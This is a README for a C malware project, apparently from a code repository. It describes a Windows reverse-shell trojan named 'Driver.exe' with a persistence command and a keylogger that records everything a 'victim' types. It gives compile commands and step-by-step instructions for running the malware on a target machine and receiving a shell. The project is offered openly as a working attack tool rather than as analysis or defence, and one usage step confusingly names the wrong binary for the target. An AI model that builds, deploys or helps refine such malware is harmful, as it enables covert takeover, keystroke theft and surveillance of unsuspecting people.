# Malware Development in C

This project is a malware written in C language that allows you to get a shell on a Windows victim and execute Windows commands as well as obtain persistence. It also acts as a keylogger.

## Compilation
On your Linux machine, compile the client and the server (don't forget to change the IPs and the port):
> gcc server.c -o server
>
> i686-w64-mingw32-gcc -o Driver.exe client.c -lwsock32 -lwininet

## Usage
1. Transfer the file server.exe on the target machine.
2. Start your server with the arguments: port and IP of your attack machine.
>   ./server <ip> <port>
3. Execute the malicious file on the target machine (you can double-click the executable).
>   .\Driver.exe

Check your Linux terminal. You now have a shell!

## Available commands:
You can execute all of the Windows commands, as well as:
> persist 

This will ensure persistence, so if the victim logs out / turns off the machine, when they go back online they will connect to you.
> keylog

This will start a keylogger that will save everything the victim types (it is saved in C:\tmp\windows.txt).
